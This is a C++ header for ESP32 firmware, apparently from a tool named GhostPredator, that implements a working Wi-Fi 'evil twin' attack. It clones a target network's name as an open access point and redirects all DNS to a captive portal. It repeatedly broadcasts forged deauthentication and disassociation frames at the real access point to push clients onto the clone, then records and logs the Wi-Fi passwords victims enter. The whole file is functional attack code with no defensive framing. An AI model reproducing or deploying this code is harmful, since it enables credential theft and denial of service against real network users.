#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <vector>
#include "../utils/logger.h"
#include "../config.h"

struct CapturedCred {
    String ssid;
    String password;
    String ip;
    unsigned long ts;
};

class EvilTwin {
public:
    static EvilTwin& get() { static EvilTwin inst; return inst; }

    bool running = false;
    String clonedSSID;
    std::vector<CapturedCred> captured;

    // Inicia AP clone com captive portal + deauth do AP real
    void start(const String& ssid, uint8_t channel) {
        if (running) stop();
        clonedSSID = ssid;

        // AP aberto imitando o alvo (sobrescreve o AP gerencial temporariamente)
        WiFi.softAP(ssid.c_str(), nullptr, channel);
        delay(500);

        // DNS wildcard -> redireciona tudo para o portal
        _dns.start(53, "*", WiFi.softAPIP());

        _deauthChannel = channel;
        _lastDeauth    = 0;
        memset(_deauthTarget, 0, 6); // broadcast — preenchido por setDeauthTarget()
        running = true;
        LOG.warn("[ET] AP clone ativo: \"" + ssid + "\" ch" + String(channel) +
                 " | portal: http://" + WiFi.softAPIP().toString());
        LOG.warn("[ET] ATENCAO: AP gerencial GhostPredator suspenso durante ET");
    }

    void stop() {
        _dns.stop();
        running = false;
        // Restaura AP gerencial
        WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL);
        LOG.info("[ET] Parado. Creds: " + String(captured.size()) +
                 " | AP gerencial restaurado: " AP_SSID);
    }

    // Configura o BSSID do AP real para deauth contínuo durante ET
    void setDeauthTarget(const uint8_t* bssid) {
        memcpy(_deauthTarget, bssid, 6);
    }

    void tick() {
        if (!running) return;
        _dns.processNextRequest();
        // Deauth contínuo do AP real a cada 5s para forçar reconexão ao ET
        if (millis() - _lastDeauth > 5000) {
            _lastDeauth = millis();
            bool hasBssid = false;
            for (int i = 0; i < 6; i++) if (_deauthTarget[i]) { hasBssid = true; break; }
            if (hasBssid) _sendDeauthBurst();
        }
    }

    void addCred(const String& ssid, const String& pass, const String& ip) {
        CapturedCred c{ ssid, pass, ip, millis() };
        captured.push_back(c);
        LOG.success("[ET] CRED: SSID=\"" + ssid + "\" PASS=\"" + pass + "\" IP=" + ip);
    }

    DNSServer& dns() { return _dns; }

private:
    DNSServer    _dns;
    uint8_t      _deauthTarget[6]  = {};
    uint8_t      _deauthChannel    = 1;
    unsigned long _lastDeauth      = 0;

    void _sendDeauthBurst() {
        esp_wifi_set_channel(_deauthChannel, WIFI_SECOND_CHAN_NONE);
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        static const uint8_t reasons[] = {0x01,0x02,0x03,0x07,0x08,0x09,0x0E,0x05};
        for (int i = 0; i < 48; i++) {
            uint8_t r = reasons[i % 8];
            // Deauth AP→broadcast
            uint8_t f[26] = {};
            f[0] = 0xC0; f[1] = 0x00;
            f[2] = 0x3A; f[3] = 0x01;
            f[24] = r;
            memcpy(f +  4, bcast,         6);
            memcpy(f + 10, _deauthTarget, 6);
            memcpy(f + 16, _deauthTarget, 6);
            esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
            // Disassoc AP→broadcast
            f[0] = 0xA0;
            esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
        }
    }
};
